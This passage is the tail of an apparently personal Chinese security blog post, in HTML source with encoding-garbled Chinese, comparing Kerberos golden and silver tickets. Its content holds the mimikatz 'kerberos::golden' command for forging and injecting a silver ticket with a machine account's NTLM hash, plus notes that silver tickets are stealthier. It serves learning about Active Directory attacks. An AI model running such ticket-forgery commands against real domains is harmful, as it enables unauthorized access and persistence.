class="hljs-built_in">File</span> <span class="hljs-built_in">Share</span>         <span class="hljs-variable">CIFS</span><br><span class="hljs-variable">LDAP</span>                       <span class="hljs-variable">LDAP</span><br><span class="hljs-variable">Windows</span> <span class="hljs-variable">Remote</span> <span class="hljs-variable">Server</span>      <span class="hljs-variable">RPCSS</span>„ÄÅ<span class="hljs-variable">LDAP</span>„ÄÅ<span class="hljs-variable">CIFS</span><br></code></pre></td></tr></table></figure>

<p>/rc4:ÂüüÊéßÁöÑËÆ°ÁÆóÊú∫Ë¥¶Êà∑ntlm hash</p>
<p>/user:Ë¶Å‰º™ÈÄ†ÁöÑÁî®Êà∑Âêç(<strong>‰ªªÊÑèÔºÅÂåÖÊã¨‰∏çÂ≠òÂú®ÁöÑÁî®Êà∑</strong>)</p>
<p>mimikatz.exe ‚Äúkerberos::golden /domain:Âüü /sid:SID /target:ÂüüÂÖ®Áß∞ /service:Ë¶ÅËÆøÈóÆÁöÑÊúçÂä° /rc4:NTLM /user:silver /ptt‚ÄùÂç≥ÂèØÁîüÊàêÂπ∂ÂØºÂÖ•Silver Ticket</p>
</blockquote>
<h3 id="ÈªÑÈáëÁ•®ÊçÆÂíåÁôΩÈì∂Á•®ÊçÆÁöÑ‰∏çÂêå"><a href="#ÈªÑÈáëÁ•®ÊçÆÂíåÁôΩÈì∂Á•®ÊçÆÁöÑ‰∏çÂêå" class="headerlink" title="ÈªÑÈáëÁ•®ÊçÆÂíåÁôΩÈì∂Á•®ÊçÆÁöÑ‰∏çÂêå"></a>ÈªÑÈáëÁ•®ÊçÆÂíåÁôΩÈì∂Á•®ÊçÆÁöÑ‰∏çÂêå</h3><p>ËÆøÈóÆÊùÉÈôê‰∏çÂêåÔºö</p>
<ul>
<li>ÈªÑÈáëÁ•®ÊçÆGolden TicketÔºö‰º™ÈÄ†TGTÔºåÂèØ‰ª•Ëé∑Âèñ‰ªª‰ΩïKerberosÊúçÂä°ÊùÉÈôê</li>
<li>ÁôΩÈì∂Á•®ÊçÆSilver TicketÔºö‰º™ÈÄ†TGSÔºåÂè™ËÉΩËÆøÈóÆÊåáÂÆöÁöÑÊúçÂä°</li>
</ul>
<p>Âä†ÂØÜÊñπÂºè‰∏çÂêåÔºö</p>
<ul>
<li>Golden TicketÁî±krbtgtÁöÑHashÂä†ÂØÜ</li>
<li>Silver Ticket Áî±ÊúçÂä°Ë¥¶Âè∑ÔºàÈÄöÂ∏∏‰∏∫ËÆ°ÁÆóÊú∫Ë¥¶Êà∑ÔºâHashÂä†ÂØÜ</li>
<li>ËÆ§ËØÅÊµÅÁ®ã‰∏çÂêåÔºö</li>
<li>Golden TicketÁöÑÂà©Áî®ËøáÁ®ãÈúÄË¶ÅËÆøÈóÆÂüüÊéßÔºå</li>
<li>ËÄåSilver Ticket‰∏çÈúÄË¶Å</li>
</ul>
<p>ÈöêËîΩÊÄß‰∏çÂêåÔºö</p>
<ul>
<li>ÁôΩÈì∂Á•®ÊçÆ‰æùËµñ‰∫éÊúçÂä°Ë¥¶Âè∑ÁöÑÂØÜÁ†ÅÊï£ÂàóÂÄºÔºåËÄåÈªÑÈáëÁ•®ÊçÆÈúÄË¶ÅÂà©Áî®krbtgtË¥¶Âè∑ÁöÑÂØÜÁ†ÅÊï£ÂàóÂÄºÔºåÂõ†Ê≠§ÁôΩÈì∂Á•®ÊçÆÊõ¥ÈöêËîΩ</li>
</ul>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/network/">network</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/knowledge/">knowledge</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    Êú¨ÂçöÂÆ¢ÊâÄÊúâÊñáÁ´†Èô§ÁâπÂà´Â£∞ÊòéÂ§ñÔºåÂùáÈááÁî® <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 ÂçèËÆÆ</a> ÔºåËΩ¨ËΩΩËØ∑Ê≥®ÊòéÂá∫Â§ÑÔºÅ
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/04/11/%E5%88%9D%E6%8E%A2Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">ÂàùÊé¢DockerÂÆπÂô®ÈÄÉÈÄ∏</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/03/27/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">
                        <span class="hidden-mobile">ÊùÉÈôêÊèêÂçá</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments" lazyload>
                
                  
                
                
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"lCUF08cIQ1BPgn7X9fjMMTbe-MdYXbMMI","appKey":"RSMbcrKIFnecyMgNGc47g3tN","placeholder":"ËØ¥ÁÇπ‰ªÄ‰πà","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"requiredFields":[]},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          Fluid.plugins.initFancyBox('#valine .vcontent img:not(.vemoji)');
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="http://kIl3rr.github.io" target="_blank" rel="nofollow noopener"><span>kIl3rr</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">ËΩΩÂÖ•Â§©Êï∞...</span> <span id="times">ËΩΩÂÖ•Êó∂ÂàÜÁßí...</span> <script src="/js/duration.js"></script> </div> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- ‰∏çËíúÂ≠êÁªüËÆ°PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            ÊÄªËÆøÈóÆÈáè 
            <span id="busuanzi_value_site_pv"></span>
             Ê¨°
          </span>
      
      
        <!-- ‰∏çËíúÂ≠êÁªüËÆ°UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            ÊÄªËÆøÂÆ¢Êï∞ 
            <span id="busuanzi_value_site_uv"></span>
             ‰∫∫
          </span>
      
    
  </div>


  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  <script  src="/js/local-search.js" ></script>



  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  
    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
  
  
    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
  



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>












  

  
    <!-- Google Analytics -->
    <script defer>
      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
      ga.l = +new Date;
      ga('create', 'G-SL9T1KRBQY', 'auto');
      ga('send', 'pageview');
    </script>
    <script async src='https://www.google-analytics.com/analytics.js'></script>
  

  

  

  

  





<!-- ‰∏ªÈ¢òÁöÑÂêØÂä®È°π ‰øùÊåÅÂú®ÊúÄÂ∫ïÈÉ® -->
<script  src="/js/boot.js" ></script>


</body>
</html>
